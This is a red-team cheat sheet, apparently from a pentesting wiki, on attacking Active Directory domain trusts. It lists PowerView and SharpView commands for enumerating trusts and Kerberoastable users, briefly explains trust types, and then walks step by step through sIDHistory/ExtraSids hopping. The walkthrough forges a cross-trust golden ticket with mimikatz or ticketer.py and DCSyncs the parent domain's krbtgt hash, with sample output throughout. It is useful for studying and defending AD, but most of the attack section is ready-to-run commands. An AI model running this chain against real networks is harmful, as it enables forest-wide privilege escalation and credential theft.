# Attack Trusts

> Note that the Active Directory domain is not the security boundary; the AD forest is. (Sean Metcalf, [ref](https://adsecurity.org/?p=1640))

* [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
* [http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/](http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/)
* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
* [https://habr.com/ru/company/jetinfosystems/blog/466445/](https://habr.com/ru/company/jetinfosystems/blog/466445/)

Enum foreign users and groups:

```
PowerView3 > Get-DomainForeignUser -Domain megacorp.com
PowerView3 > Get-DomainForeignGroupMember -Domain megacorp.com
```

List user accounts from a target domain with SPNs set for [Kerberoasting](pentest/internal/ad/roasting.md#kerberoasting):

```
PowerView3 > Get-DomainUser -SPN -Domain megacorp.local | ? {$_.samAccountName -ne "krbtgt"} | select samAccountName,memberOf,servicePrincipalName | fl
PS > .\SharpView.exe Get-DomainUser -SPN -Domain megacorp.local -Properties samAccountName,memberOf,servicePrincipalName -Filter '(!(samAccountName=krbtgt))'
```




## Theory

* **Trust** 👉🏻 a link between the authentication systems of two domains.
* **Transitive** trust 👉🏻 the trust is extended to objects which the child domain trusts.
* **Non-transitive** trust 👉🏻 only the child domain itself is trusted.
* **Bidirectional** (two-way) trust 👉🏻 users from both trusting domains can access resources.
* **One-way** trust 👉🏻 only users in a trusted domain can access resources in a trusting domain, not vice-versa (the direction of trust is opposite to the direction of access).

Some trust types:

| **Trust Type**           | **Description**                                                                                                                                                 |
|--------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Parent-child             | Domains within the same forest. The child domain has a *bidirectional transitive* trust with the parent domain.                                                 |
| Tree-root (intra-forest) | A *bidirectional transitive* trust between a forest root domain and a new tree root domain. Created implicitly when a new domain tree is created in the forest. |
| Forest                   | A *transitive* trust between two forest root domains. Enforces SID filtering.                                                                                   |
| External (inter-forest)  | A *non-transitive* trust between two separate domains in separate forests that are not already joined by a forest trust. Enforces SID filtering.                |




## sIDHistory/ExtraSids Hopping

* [http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
* [http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)

Check if SID filtering is enabled for a trust:

```
Cmd > netdom.exe trust child.megacorp.local /domain:megacorp.local /quarantine
SID filtering is not enabled for this trust. All SIDs presented in an
authentication request from this domain will be honored.
```

Use PowerView to enumerate domain trusts:

```
PowerView3 > Get-ForestDomain

Forest                  : megacorp.local
DomainControllers       : {DC03.megacorp.local, DC04.megacorp.local}
Children                : {child.megacorp.local}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  :
PdcRoleOwner            : DC03.megacorp.local
RidRoleOwner            : DC03.megacorp.local
InfrastructureRoleOwner : DC03.megacorp.local
Name                    : megacorp.local

Forest                  : megacorp.local
DomainControllers       : {DC01.child.megacorp.local, DC02.child.megacorp.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : megacorp.local
PdcRoleOwner            : DC01.child.megacorp.local
RidRoleOwner            : DC01.child.megacorp.local
InfrastructureRoleOwner : DC01.child.megacorp.local
Name                    : child.megacorp.local

PowerView3 > Get-DomainTrust | ft

SourceName           TargetName           TrustType                TrustAttributes TrustDirection
----------           ----------           ---------                --------------- --------------
child.megacorp.local megacorp.local       WINDOWS_ACTIVE_DIRECTORY WITHIN_FOREST   Bidirectional
child.megacorp.local megacorp.com         WINDOWS_ACTIVE_DIRECTORY FILTER_SIDS     Bidirectional

PowerView3 > Get-DomainTrustMapping | ft

SourceName           TargetName           TrustType                TrustAttributes TrustDirection
----------           ----------           ---------                --------------- --------------
child.megacorp.local megacorp.local       WINDOWS_ACTIVE_DIRECTORY WITHIN_FOREST   Bidirectional
child.megacorp.local megacorp.com         WINDOWS_ACTIVE_DIRECTORY FILTER_SIDS     Bidirectional
megacorp.com         child.megacorp.local WINDOWS_ACTIVE_DIRECTORY FILTER_SIDS     Bidirectional
megacorp.local       child.megacorp.local WINDOWS_ACTIVE_DIRECTORY WITHIN_FOREST   Bidirectional
```

Exploiting Bidirectional-ParentChild trust between child.megacorp.local ⟷ megacorp.local.

For creating a cross-trust golden ticket we'll need:

1. child domain FQDN (`child.megacorp.local`);
2. name of the child domain's DC machine account and its RID (`DC01$`, `31337`);
3. the SID of the child domain (`S-1-5-21-4266912945-3985045794-2943778634`);
4. the SID of the parent domain (`S-1-5-21-2284550090-1208917427-1204316795`);
5. compomised krbtgt hash from the child domain (`00ff00ff00ff00ff00ff00ff00ff00ff`);
6. ???
7. PROFIT.

```
1.
PS > $env:userdnsdomain
CHILD.MEGACORP.LOCAL

2.
PowerView3 > (Get-DomainComputer DC01.child.megacorp.local | select ObjectSID).ObjectSID
S-1-5-21-4266912945-3985045794-2943778634-31337

3.
PowerView3 > Get-DomainSID
S-1-5-21-4266912945-3985045794-2943778634

4.
PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-2284550090-1208917427-1204316795-502
```

Create cross-trust golden ticket:

```
mimikatz # kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:31337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt
Or
$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01'
```

For DCSyncing we'll need only parent domain FQDN (`megacorp.local`):

```
PS > ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
megacorp.local
```

DCSync:

```
mimikatz # lsadump::dcsync /user:megacorp.local\krbtgt /domain:megacorp.local
```




## UnD + PrinterBug

* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
* [https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe](https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe)




## Visualization (yEd)

* [http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
* [https://github.com/HarmJ0y/TrustVisualizer](https://github.com/HarmJ0y/TrustVisualizer)
* [https://github.com/snovvcrash/TrustVisualizer](https://github.com/snovvcrash/TrustVisualizer)
* [https://www.yworks.com/products/yed](https://www.yworks.com/products/yed)

```
PowerView3 > Get-DomainTrustMapping | Export-Csv -NoTypeInformation trusts.csv
$ git clone https://github.com/snovvcrash/TrustVisualizer && cd TrustVisualizer
$ pip3 install -r requirements.txt
$ python3 TrustVisualizer.py trusts.csv
```
